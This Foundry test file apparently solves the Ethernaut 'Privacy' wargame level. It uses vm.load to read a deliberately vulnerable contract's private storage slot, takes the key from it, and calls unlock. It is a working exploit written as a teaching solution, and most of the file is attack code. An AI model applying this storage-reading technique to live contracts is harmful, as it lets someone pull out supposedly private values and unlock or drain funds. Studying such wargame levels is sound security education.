// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Privacy} from "../../src/12/Privacy.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {PrivacyFactory} from "src/12/PrivacyFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract PrivacyTest is Test, BaseTest {
    Privacy public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new PrivacyFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Privacy(instance);
    }

    function testBalanceInstanceContractis0() public view {
        assert(instanceContract.locked() == true);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        ///////// This section is for a DYNAMIC Array ////////
        // bytes32 slotVal = vm.load(address(instanceContract), bytes32(uint256(3)));
        // // The first slot contains the size of the array
        // uint256 arrayLength = uint256(slotVal);
        // console.log(arrayLength);
        // // Calculate the start of the contiguous section in storage containing the array contents then add the index for values
        // bytes32 data = vm.load(address(instanceContract), bytes32(uint256(keccak256(abi.encodePacked(uint256(3)))) + 2));
        /////////////////////////////////////////////////

        ///// FIXED Array /////////
        // Sequential data storage
        bytes32 data = vm.load(address(instanceContract), bytes32(uint256(3 + 2)));
        // Same thing
        // bytes32 data = vm.load(address(instanceContract), bytes32(abi.encode(5)));

        console.logBytes32(data);
        console.logBytes32(keccak256(abi.encodePacked(tx.origin, "2")));

        instanceContract.unlock(bytes16(data));

        vm.stopPrank();

        assert(instanceContract.locked() == false);
    }
}
